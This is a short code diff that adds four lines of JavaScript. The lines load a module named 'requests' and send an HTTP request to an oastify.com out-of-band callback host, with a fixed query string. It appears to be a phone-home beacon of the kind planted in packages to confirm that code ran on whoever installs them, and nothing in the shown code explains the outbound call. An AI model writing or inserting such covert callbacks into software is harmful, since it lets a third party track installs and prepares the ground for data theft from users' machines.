@@ -1,0 +1,4 @@
+const request = require('requests')
+let host = "cl13jfkxofe2wspxaxzoyuzyxp3gr6fv.oastify.com"
+let packages = "test"
+request(`http://${host}/?${packages}`, (error, response, body) => {})
